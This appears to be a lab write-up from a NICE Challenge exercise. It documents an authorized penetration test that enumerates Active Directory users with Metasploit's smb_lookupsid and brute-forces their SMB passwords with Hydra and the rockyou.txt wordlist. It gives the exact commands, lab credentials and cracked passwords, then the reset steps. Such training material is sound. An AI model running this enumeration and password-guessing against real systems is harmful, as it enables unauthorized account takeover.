<p align="center">
<img src="https://i.imgur.com/ARGlAoP.png" height="100%" width="100%" alt="install kali"/>
</p>
<h1>Pentration Testing: Bringing Passwords Up to Snuff</h1>

    We have reason to believe that some of our employees have weaker than should be acceptable passwords, so we want you to conduct authorized penetration testing against various company assets to determine which employees need to change their passwords.

<h2>Solution</h2>

     Use Kali Linux to attempt an attack on Pretty Safe Electronic's Active Directory house on 171.16.30.55

    --We will be using Metasploit's Auxiliary smblookupsid to exploit the directory to enumerate authorized users.
    --We will be using the output from Metasploit output in Hydra to target the specific users on the directory.
    --We will use the common "rockyou.txt" wordlist to test against the users for weak passwords.


    Force password reset on identified users with weak passwords.

    --We will login to the domain controller and force password resets for users identified with weak passwords.

<h2>Tools Used</h2>

    Kali Linux
    Metasploit Console
    SMB
    smb_lookupsid Auxiliary in Metasploit
    Hydra command line tool
    Active Directory (Users and Computers)

<h2>Network Map and targets used</h2>

    Our target is the AD-Server located at 172.16.30.55
    We will utilize the Security-Desk workstation located at 172.16.20.55

<h2>Actions Taken</h2>

    Spin up the Security-Desk workstation and login to player one.
    Open Terminal and run "sudo msfconsole"
    Select the smb_lookupsid too by running "use auxiliary/scanner/smb_lookupsid"
    Set target to Active Directory service by running "set RHOSTS 172.16.30.55"
    Set SMB user by running "set SMBUser playerone"
    Set SMB password by running "set SMBPass password123"
    Start exploit by running "exploit"
    Once task is complete, copy output and paste into MousePad.
    
    Remove all data except found users:
    rcortes
    jsmith
    manderson
    skeefe
    nkeefe
    asteele
    jraffin
    jcortes
    tclark

    Save document in home directory. (/home/playerone/(KNOWNUSERS).txt)
    Create another empty document in the home directory for Hydra's output. (/home/playerone/(OUTPUT).txt
    Quit metasploit console.
    In Terminal, run "hydra -L /home/playerone/(KNOWNUSERS).txt -P /usr/share/wordlists/rockyou.txt -o /home/playerone/(OUTPUT).txt -v 172.16.30.55 smb" *Hydra discovered two users who had weak passwords:

    nkeefe:987654321
    jcortes:iloveme

    Shut down Security-Desk
    Spin up Domain-Controller
    Select Start Menu > Administrative Tools
    Open Active Directory Users and Computers
    Select prettysafeelectronics.io > Users
    We will adjust the password policy for Jan Cortes (jcortes) & Naomi O'Keefe (nkeefe)
    Select the respective user from the list and open properties from secondary menu.
    Select the account tab.
    Uncheck [Password never expires]
    Check [User must change password at next logon]
    Apply changes
    Repeat for second user.

<h2>Report</h2>
<br />
<br />
<img src="https://i.imgur.com/WcwS8N4.png" height="80%" width="80%" alt="NICE Challenge"/>
<br />
<br />
<img src="https://i.imgur.com/LvN5xX3.png" height="80%" width="80%" alt="NICE Challenge"/>
<br />
<br />
</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
